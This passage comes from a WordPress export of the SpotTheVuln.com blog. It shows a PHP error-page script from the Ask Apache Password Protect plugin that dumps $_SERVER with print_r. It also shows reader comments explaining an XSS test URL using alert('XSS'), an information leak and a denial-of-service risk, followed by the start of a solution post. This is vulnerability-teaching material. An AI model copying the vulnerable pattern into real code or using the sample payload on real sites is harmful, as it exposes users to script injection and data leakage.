        400 =&gt; 'Bad Request',
        401 =&gt; 'Authorization Required',
        402 =&gt; 'Payment Required',
        403 =&gt; 'Forbidden',
        404 =&gt; 'Not Found',
        405 =&gt; 'Method Not Allowed',
        406 =&gt; 'Not Acceptable',
        407 =&gt; 'Proxy Authentication Required',
        408 =&gt; 'Request Time-out',
        409 =&gt; 'Conflict',
        410 =&gt; 'Gone',
        411 =&gt; 'Length Required',
        412 =&gt; 'Precondition Failed',
        413 =&gt; 'Request Entity Too Large',
        414 =&gt; 'Request-URI Too Large',
        415 =&gt; 'Unsupported Media Type',
        416 =&gt; 'Requested Range Not Satisfiable',
        417 =&gt; 'Expectation Failed',
        418 =&gt; 'unused',
        419 =&gt; 'unused',
        420 =&gt; 'unused',
        421 =&gt; 'unused',
        422 =&gt; 'Unprocessable Entity',
        423 =&gt; 'Locked',
        424 =&gt; 'Failed Dependency',
        425 =&gt; 'No code',
        426 =&gt; 'Upgrade Required',
        500 =&gt; 'Internal Server Error',
        501 =&gt; 'Method Not Implemented',
        502 =&gt; 'Bad Gateway',
        503 =&gt; 'Service Temporarily Unavailable',
        504 =&gt; 'Gateway Time-out',
        505 =&gt; 'HTTP Version Not Supported',
        506 =&gt; 'Variant Also Negotiates',
        507 =&gt; 'Insufficient Storage',
        508 =&gt; 'unused',
        509 =&gt; 'unused',
        510 =&gt; 'Not Extended',
);

$err_status_codes = array(
'100'=&gt;array('Continue',''),
'101'=&gt;array('Switching Protocols', ''),
'102'=&gt;array('Processing',  ''),
'200'=&gt;array('OK', ''),
'201'=&gt;array('Created',  ''),
'202'=&gt;array('Accepted',  ''),
'203'=&gt;array('Non-Authoritative Information', ''),
'204'=&gt;array('No Content',  ''),
'205'=&gt;array('Reset Content',  ''),
'206'=&gt;array('Partial Content', ''),
'207'=&gt;array('Multi-Status',  ''),
'300'=&gt;array('Multiple Choices', ''),
'301'=&gt;array('Moved Permanently', 'The document has moved &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'302'=&gt;array('Found', 'The document has moved &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'303'=&gt;array('See Other',  'The answer to your request is located &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'304'=&gt;array('Not Modified',  ''),
'305'=&gt;array('Use Proxy',  'This resource is only accessible through the proxy THEREQUESTURIYou will need to configure your client to use that proxy.'),
'307'=&gt;array('Temporary Redirect', 'The document has moved &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'400' =&gt; array('Bad Request', 'Your browser sent a request that this server could not understand.'),
'401' =&gt; array('Authorization Required', 'This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\'t understand how to supply the credentials required.'),
'402' =&gt; array('Payment Required', 'INTERROR'),
'403' =&gt; array('Forbidden', 'You don\'t have permission to access THEREQUESTURI on this server.'),
'404' =&gt; array('Not Found', 'We couldn\'t find &lt;acronym title=&quot;THEREQUESTURI&quot;&gt;that uri&lt;/acronym&gt; on our server, though it\'s most certainly not your fault.'),
'405' =&gt; array('Method Not Allowed', 'The requested method THEREQMETH is not allowed for the URL THEREQUESTURI.'),
'406' =&gt; array('Not Acceptable', 'An appropriate representation of the requested resource THEREQUESTURI could not be found on this server.'),
'407' =&gt; array('Proxy Authentication Required', 'This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\'t understand how to supply the credentials required.'),
'408' =&gt; array('Request Time-out', 'Server timeout waiting for the HTTP request from the client.'),
'409' =&gt; array('Conflict', 'INTERROR'),
'410' =&gt; array('Gone', 'The requested resourceTHEREQUESTURIis no longer available on this server and there is no forwarding address. Please remove all references to this resource.'),
'411' =&gt; array('Length Required', 'A request of the requested method GET requires a valid Content-length.'),
'412' =&gt; array('Precondition Failed', 'The precondition on the request for the URL THEREQUESTURI evaluated to false.'),
'413' =&gt; array('Request Entity Too Large', 'The requested resource THEREQUESTURI does not allow request data with GET requests, or the amount of data provided in the request exceeds the capacity limit.'),
'414' =&gt; array('Request-URI Too Large', 'The requested URL\'s length exceeds the capacity limit for this server.'),
'415' =&gt; array('Unsupported Media Type', 'The supplied request data is not in a format acceptable for processing by this resource.'),
'416' =&gt; array('Requested Range Not Satisfiable', ''),
'417' =&gt; array('Expectation Failed', 'The expectation given in the Expect request-header field could not be met by this server. The client sent &lt;code&gt;Expect:&lt;/code&gt;'),
'422' =&gt; array('Unprocessable Entity', 'The server understands the media type of the request entity, but was unable to process the contained instructions.'),
'423' =&gt; array('Locked', 'The requested resource is currently locked. The lock must be released or proper identification given before the method can be applied.'),
'424' =&gt; array('Failed Dependency', 'The method could not be performed on the resource because the requested action depended on another action and that other action failed.'),
'425' =&gt; array('No code', 'INTERROR'),
'426' =&gt; array('Upgrade Required', 'The requested resource can only be retrieved using SSL. The server is willing to upgrade the current connection to SSL, but your client doesn\'t support it. Either upgrade your client, or try requesting the page using https://'),
'500' =&gt; array('Internal Server Error', 'INTERROR'),
'501' =&gt; array('Method Not Implemented', 'GET to THEREQUESTURI not supported.'),
'502' =&gt; array('Bad Gateway', 'The proxy server received an invalid response from an upstream server.'),
'503' =&gt; array('Service Temporarily Unavailable', 'The server is temporarily unable to service your request due to maintenance downtime or capacity problems. Please try again later.'),
'504' =&gt; array('Gateway Time-out', 'The proxy server did not receive a timely response from the upstream server.'),
'505' =&gt; array('HTTP Version Not Supported', 'INTERROR'),
'506' =&gt; array('Variant Also Negotiates', 'A variant for the requested resource &lt;code&gt;THEREQUESTURI&lt;/code&gt; is itself a negotiable resource. This indicates a configuration error.'),
'507' =&gt; array('Insufficient Storage','The method could not be performed on the resource because the server is unable to store the representation needed to successfully complete the request. There is insufficient free space left in your storage allocation.'),
'510' =&gt; array('Not Extended', 'A mandatory extension policy in the request is not accepted by the server for this resource.')
);

if (isset($_SERVER['REDIRECT_STATUS'])) $err_code = $_SERVER['REDIRECT_STATUS'];

$err_req_meth = $_SERVER['REQUEST_METHOD'];
$err_req = htmlentities(strip_tags($_SERVER['REQUEST_URI']));
$err_phrase = $err_status_codes[$err_code][0];
$err_body = str_replace(
 array('INTERROR', 'THEREQUESTURI', 'THEREQMETH'),
 array('The server encountered an internal error or misconfiguration and was unable to complete your request.',$err_req, $err_req_meth),$err_status_codes[$err_code][1]);

@header(&quot;HTTP/1.1 $err_code $err_phrase&quot;, 1);
@header(&quot;Status: $err_code $err_phrase&quot;, 1);

if ( $err_code=='400'||$err_code=='403'||$err_code=='405'||$err_code[0]=='5'){
 @header(&quot;Connection: close&quot;, 1);
 if ($err_code == '405') @header('Allow: GET,HEAD,POST,OPTIONS,TRACE');
 echo &quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//IETF//DTD HTML 2.0//EN\&quot;&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;{$err_code} {$err_phrase}&lt;/title&gt;\n&lt;h1&gt;{$err_phrase}&lt;/h1&gt;\n&lt;p&gt;{$err_body}&lt;br&gt;\n&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;&quot;;
} else echo '&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;
       &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;title&gt;'.$err_code.' '.$err_phrase.'&lt;/title&gt;
  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;'.$err_code.' '.$err_phrase.'&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;
'.$err_body.'&lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt;
'.print_r($_SERVER,1).'
&lt;/pre&gt;
  &lt;/body&gt;
&lt;/html&gt;';
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1433</wp:post_id>
		<wp:post_date>2011-04-25 05:30:16</wp:post_date>
		<wp:post_date_gmt>2011-04-25 12:30:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bases</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2015</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-04-27 22:20:12</wp:comment_date>
			<wp:comment_date_gmt>2011-04-28 05:20:12</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[The script tags around the "alert('xss')" were removed.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304315070.0011";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1303968012.4456";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2014</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-04-27 22:16:09</wp:comment_date>
			<wp:comment_date_gmt>2011-04-28 05:16:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I am not a PHP person (move a Java expert)

The problem is at line 150.  You have XSS, insecure error reporting and information leakage:

XSS because print_r($_SERVER, 1) will output the PATH_INFO AND REQUEST_URI.

You can include Path parameter in the url such that the XSS in included as follows:

http://www.google.com/app/vulnerable.php;alert('XSS')?...


You also have an insecure error reporting and information leakage because 
"$_SERVER" will output:

Taken from http://php.net/manual/en/reserved.variables.server.php

'PHP_SELF'
    The filename of the currently executing script, relative to the document root. For instance, $_SERVER['PHP_SELF'] in a script at the address http://example.com/test.php/foo.bar would be /test.php/foo.bar. The __FILE__ constant contains the full path and filename of the current (i.e. included) file. If PHP is running as a command-line processor this variable contains the script name since PHP 4.3.0. Previously it was not available. 
'argv'
    Array of arguments passed to the script. When the script is run on the command line, this gives C-style access to the command line parameters. When called via the GET method, this will contain the query string. 
'argc'
    Contains the number of command line parameters passed to the script (if run on the command line). 
'GATEWAY_INTERFACE'
    What revision of the CGI specification the server is using; i.e. 'CGI/1.1'. 
'SERVER_ADDR'
    The IP address of the server under which the current script is executing. 
'SERVER_NAME'
    The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host. 
'SERVER_SOFTWARE'
    Server identification string, given in the headers when responding to requests. 
'SERVER_PROTOCOL'
    Name and revision of the information protocol via which the page was requested; i.e. 'HTTP/1.0'; 
'REQUEST_METHOD'
    Which request method was used to access the page; i.e. 'GET', 'HEAD', 'POST', 'PUT'.

        Note:

        PHP script is terminated after sending headers (it means after producing any output without output buffering) if the request method was HEAD.

'REQUEST_TIME'
    The timestamp of the start of the request. Available since PHP 5.1.0. 
'QUERY_STRING'
    The query string, if any, via which the page was accessed. 
'DOCUMENT_ROOT'
    The document root directory under which the current script is executing, as defined in the server's configuration file. 
'HTTP_ACCEPT'
    Contents of the Accept: header from the current request, if there is one. 
'HTTP_ACCEPT_CHARSET'
    Contents of the Accept-Charset: header from the current request, if there is one. Example: 'iso-8859-1,*,utf-8'. 
'HTTP_ACCEPT_ENCODING'
    Contents of the Accept-Encoding: header from the current request, if there is one. Example: 'gzip'. 
'HTTP_ACCEPT_LANGUAGE'
    Contents of the Accept-Language: header from the current request, if there is one. Example: 'en'. 
'HTTP_CONNECTION'
    Contents of the Connection: header from the current request, if there is one. Example: 'Keep-Alive'. 
'HTTP_HOST'
    Contents of the Host: header from the current request, if there is one. 
'HTTP_REFERER'
    The address of the page (if any) which referred the user agent to the current page. This is set by the user agent. Not all user agents will set this, and some provide the ability to modify HTTP_REFERER as a feature. In short, it cannot really be trusted. 
'HTTP_USER_AGENT'
    Contents of the User-Agent: header from the current request, if there is one. This is a string denoting the user agent being which is accessing the page. A typical example is: Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586). Among other things, you can use this value with get_browser() to tailor your page's output to the capabilities of the user agent. 
'HTTPS'
    Set to a non-empty value if the script was queried through the HTTPS protocol.

        Note: Note that when using ISAPI with IIS, the value will be off if the request was not made through the HTTPS protocol. 

'REMOTE_ADDR'
    The IP address from which the user is viewing the current page. 
'REMOTE_HOST'
    The Host name from which the user is viewing the current page. The reverse dns lookup is based off the REMOTE_ADDR of the user.

        Note: Your web server must be configured to create this variable. For example in Apache you'll need HostnameLookups On inside httpd.conf for it to exist. See also gethostbyaddr(). 

'REMOTE_PORT'
    The port being used on the user's machine to communicate with the web server. 
'SCRIPT_FILENAME'

    The absolute pathname of the currently executing script.

        Note:

        If a script is executed with the CLI, as a relative path, such as file.php or ../file.php, $_SERVER['SCRIPT_FILENAME'] will contain the relative path specified by the user.

'SERVER_ADMIN'
    The value given to the SERVER_ADMIN (for Apache) directive in the web server configuration file. If the script is running on a virtual host, this will be the value defined for that virtual host. 
'SERVER_PORT'
    The port on the server machine being used by the web server for communication. For default setups, this will be '80'; using SSL, for instance, will change this to whatever your defined secure HTTP port is. 
'SERVER_SIGNATURE'
    String containing the server version and virtual host name which are added to server-generated pages, if enabled. 
'PATH_TRANSLATED'
    Filesystem- (not document root-) based path to the current script, after the server has done any virtual-to-real mapping.

        Note: As of PHP 4.3.2, PATH_TRANSLATED is no longer set implicitly under the Apache 2 SAPI in contrast to the situation in Apache 1, where it's set to the same value as the SCRIPT_FILENAME server variable when it's not populated by Apache. This change was made to comply with the CGI specification that PATH_TRANSLATED should only exist if PATH_INFO is defined. Apache 2 users may use AcceptPathInfo = On inside httpd.conf to define PATH_INFO. 

'SCRIPT_NAME'
    Contains the current script's path. This is useful for pages which need to point to themselves. The __FILE__ constant contains the full path and filename of the current (i.e. included) file. 
'REQUEST_URI'
    The URI which was given in order to access this page; for instance, '/index.html'. 
'PHP_AUTH_DIGEST'
    When doing Digest HTTP authentication this variable is set to the 'Authorization' header sent by the client (which you should then use to make the appropriate validation). 
'PHP_AUTH_USER'
    When doing HTTP authentication this variable is set to the username provided by the user. 
'PHP_AUTH_PW'
    When doing HTTP authentication this variable is set to the password provided by the user. 
'AUTH_TYPE'
    When doing HTTP authenticated this variable is set to the authentication type. 
'PATH_INFO'
    Contains any client-provided pathname information trailing the actual script filename but preceding the query string, if available. For instance, if the current script was accessed via the URL http://www.example.com/php/path_info.php/some/stuff?foo=bar, then $_SERVER['PATH_INFO'] would contain /some/stuff. 
'ORIG_PATH_INFO'
    Original version of 'PATH_INFO' before processed by PHP.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1303967769.528";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304315073.1165";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2016</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-04-27 22:46:57</wp:comment_date>
			<wp:comment_date_gmt>2011-04-28 05:46:57</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Billy,

One more thing I spotted.

Denial of Service

According to http://ilia.ws/archives/66-Security-Implications-of-var_exportprint_r.html

********************************************************************************
The print_r() function is similar in function, except the returned data is intended for debugging and not storage. As with var_export() by passing a 2nd optional parameter you can force the data to be returned as a string rather then dumped to screen.

Herein lies the problem, when it comes to storing the data, this is done by enabling output buffering of the content without a set buffer size limit. Consequently, by forcing the function to generate a massive string it is possible to launch a denial of service attack aimed at exhausting both processor and memory.
Some of you are probably thinking this is pretty hard to accomplish via user input, requiring hundreds of megabytes of data to be delivered, but this couldn't be further from the truth. To successfully complete such as an attack all you need is to submit a post request which takes just 1 line of code to generate:
PHP:



This will force PHP to create a 20,000 dimensional array, causing the generated output for var_export($foo,1); or print_r($foo,1); to take hundreds of megabytes, eventually leading to PHP crash. The actual size of the request is a mere 40 kilobytes.

*****************************************************************************

So an attacker could create a 20,000 dimensional array as one of the HTTP headers and cause a denial of service.


Regards,
Abe]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304315068.0618";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1303969617.2092";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2018</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/04/bases-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-04-29 05:32:07</wp:comment_date>
			<wp:comment_date_gmt>2011-04-29 12:32:07</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Bases [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304080327.5405";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304315076.0176";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Bases - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/04/bases-cross-site-scripting/</link>
		<pubDate>Fri, 29 Apr 2011 12:30:15 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1435</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Ask Apache Password Protect

Fixed in Version: 4.6

Issue Type: Cross Site Scripting

Original Code: <a href="http://spotthevuln.com/2011/04/bases/">Found Here</a>
<h1>Details</h1>
Pretty straightforward XSS here.  On line 150we see that the author calls print_r on $_SERVER.  $_SERVER is full of tainted variables and print_r will print all of tainted values resulting in XSS.  The developers addressed this vulnerability by simply removing the print_r code entirely.  
<br><br>
Spot the Vuln reader Abraham Kang spotted a different vulnerbility.  It's possible to use print_r to DOS the server.  Since the attacker controls several of the $_SERVER array, an attacker could create a bunch of nested arrays would have to get unwound consuming lots of server memory (in some cases cause a server crash).  This details of this attack are described here: http://ilia.ws/archives/66-Security-Implications-of-var_exportprint_r.html
<br><br>
Nice catch Abraham!

<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="150"]
&lt;?php
ob_start();
/*
array( floor($code / 100)
 1=&gt;'INFO', 2=&gt;'SUCCESS', 3=&gt;'REDIRECT', 4|5=&gt;'ERROR', 4=&gt;'CLIENT_ERROR', 5=&gt;'SERVER_ERROR', 'VALID_RESPONSE');
*/
$http_status_codes=array(
        100 =&gt; 'Continue',
        101 =&gt; 'Switching Protocols',
        102 =&gt; 'Processing',
        200 =&gt; 'OK',
        201 =&gt; 'Created',
        202 =&gt; 'Accepted',
        203 =&gt; 'Non-Authoritative Information',
        204 =&gt; 'No Content',
        205 =&gt; 'Reset Content',
        206 =&gt; 'Partial Content',
        207 =&gt; 'Multi-Status',
        300 =&gt; 'Multiple Choices',
        301 =&gt; 'Moved Permanently',
        302 =&gt; 'Found',
        303 =&gt; 'See Other',
        304 =&gt; 'Not Modified',
        305 =&gt; 'Use Proxy',
        306 =&gt; 'unused',
        307 =&gt; 'Temporary Redirect',
        400 =&gt; 'Bad Request',
        401 =&gt; 'Authorization Required',
        402 =&gt; 'Payment Required',
        403 =&gt; 'Forbidden',
        404 =&gt; 'Not Found',
        405 =&gt; 'Method Not Allowed',
        406 =&gt; 'Not Acceptable',
        407 =&gt; 'Proxy Authentication Required',
        408 =&gt; 'Request Time-out',
        409 =&gt; 'Conflict',
        410 =&gt; 'Gone',
        411 =&gt; 'Length Required',
        412 =&gt; 'Precondition Failed',
        413 =&gt; 'Request Entity Too Large',
        414 =&gt; 'Request-URI Too Large',
        415 =&gt; 'Unsupported Media Type',
        416 =&gt; 'Requested Range Not Satisfiable',
        417 =&gt; 'Expectation Failed',
        418 =&gt; 'unused',
        419 =&gt; 'unused',
        420 =&gt; 'unused',
        421 =&gt; 'unused',
        422 =&gt; 'Unprocessable Entity',
        423 =&gt; 'Locked',
        424 =&gt; 'Failed Dependency',
        425 =&gt; 'No code',
        426 =&gt; 'Upgrade Required',
        500 =&gt; 'Internal Server Error',
        501 =&gt; 'Method Not Implemented',
        502 =&gt; 'Bad Gateway',
        503 =&gt; 'Service Temporarily Unavailable',
        504 =&gt; 'Gateway Time-out',
        505 =&gt; 'HTTP Version Not Supported',
        506 =&gt; 'Variant Also Negotiates',
        507 =&gt; 'Insufficient Storage',
        508 =&gt; 'unused',
        509 =&gt; 'unused',
        510 =&gt; 'Not Extended',
);

$err_status_codes = array(
'100'=&gt;array('Continue',''),
'101'=&gt;array('Switching Protocols', ''),
'102'=&gt;array('Processing',  ''),
'200'=&gt;array('OK', ''),
'201'=&gt;array('Created',  ''),
'202'=&gt;array('Accepted',  ''),
'203'=&gt;array('Non-Authoritative Information', ''),
'204'=&gt;array('No Content',  ''),
'205'=&gt;array('Reset Content',  ''),
'206'=&gt;array('Partial Content', ''),
'207'=&gt;array('Multi-Status',  ''),
'300'=&gt;array('Multiple Choices', ''),
'301'=&gt;array('Moved Permanently', 'The document has moved &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'302'=&gt;array('Found', 'The document has moved &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'303'=&gt;array('See Other',  'The answer to your request is located &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'304'=&gt;array('Not Modified',  ''),
'305'=&gt;array('Use Proxy',  'This resource is only accessible through the proxy THEREQUESTURIYou will need to configure your client to use that proxy.'),
'307'=&gt;array('Temporary Redirect', 'The document has moved &lt;a href=&quot;THEREQUESTURI&quot;&gt;here&lt;/a&gt;.'),
'400' =&gt; array('Bad Request', 'Your browser sent a request that this server could not understand.'),
'401' =&gt; array('Authorization Required', 'This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\'t understand how to supply the credentials required.'),
'402' =&gt; array('Payment Required', 'INTERROR'),
'403' =&gt; array('Forbidden', 'You don\'t have permission to access THEREQUESTURI on this server.'),
'404' =&gt; array('Not Found', 'We couldn\'t find &lt;acronym title=&quot;THEREQUESTURI&quot;&gt;that uri&lt;/acronym&gt; on our server, though it\'s most certainly not your fault.'),
'405' =&gt; array('Method Not Allowed', 'The requested method THEREQMETH is not allowed for the URL THEREQUESTURI.'),
'406' =&gt; array('Not Acceptable', 'An appropriate representation of the requested resource THEREQUESTURI could not be found on this server.'),
'407' =&gt; array('Proxy Authentication Required', 'This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\'t understand how to supply the credentials required.'),
'408' =&gt; array('Request Time-out', 'Server timeout waiting for the HTTP request from the client.'),
'409' =&gt; array('Conflict', 'INTERROR'),
'410' =&gt; array('Gone', 'The requested resourceTHEREQUESTURIis no longer available on this server and there is no forwarding address. Please remove all references to this resource.'),
'411' =&gt; array('Length Required', 'A request of the requested method GET requires a valid Content-length.'),
'412' =&gt; array('Precondition Failed', 'The precondition on the request for the URL THEREQUESTURI evaluated to false.'),
'413' =&gt; array('Request Entity Too Large', 'The requested resource THEREQUESTURI does not allow request data with GET requests, or the amount of data provided in the request exceeds the capacity limit.'),
'414' =&gt; array('Request-URI Too Large', 'The requested URL\'s length exceeds the capacity limit for this server.'),
'415' =&gt; array('Unsupported Media Type', 'The supplied request data is not in a format acceptable for processing by this resource.'),
'416' =&gt; array('Requested Range Not Satisfiable', ''),
'417' =&gt; array('Expectation Failed', 'The expectation given in the Expect request-header field could not be met by this server. The client sent &lt;code&gt;Expect:&lt;/code&gt;'),
'422' =&gt; array('Unprocessable Entity', 'The server understands the media type of the request entity, but was unable to process the contained instructions.'),
'423' =&gt; array('Locked', 'The requested resource is currently locked. The lock must be released or proper identification given before the method can be applied.'),
'424' =&gt; array('Failed Dependency', 'The method could not be performed on the resource because the requested action depended on another action and that other action failed.'),
'425' =&gt; array('No code', 'INTERROR'),
'426' =&gt; array('Upgrade Required', 'The requested resource can only be retrieved using SSL. The server is willing to upgrade the current connection to SSL, but your client doesn\'t support it. Either upgrade your client, or try requesting the page using https://'),
'500' =&gt; array('Internal Server Error', 'INTERROR'),
'501' =&gt; array('Method Not Implemented', 'GET to THEREQUESTURI not supported.'),
'502' =&gt; array('Bad Gateway', 'The proxy server received an invalid response from an upstream server.'),
'503' =&gt; array('Service Temporarily Unavailable', 'The server is temporarily unable to service your request due to maintenance downtime or capacity problems. Please try again later.'),
'504' =&gt; array('Gateway Time-out', 'The proxy server did not receive a timely response from the upstream server.'),
'505' =&gt; array('HTTP Version Not Supported', 'INTERROR'),
'506' =&gt; array('Variant Also Negotiates', 'A variant for the requested resource &lt;code&gt;THEREQUESTURI&lt;/code&gt; is itself a negotiable resource. This indicates a configuration error.'),
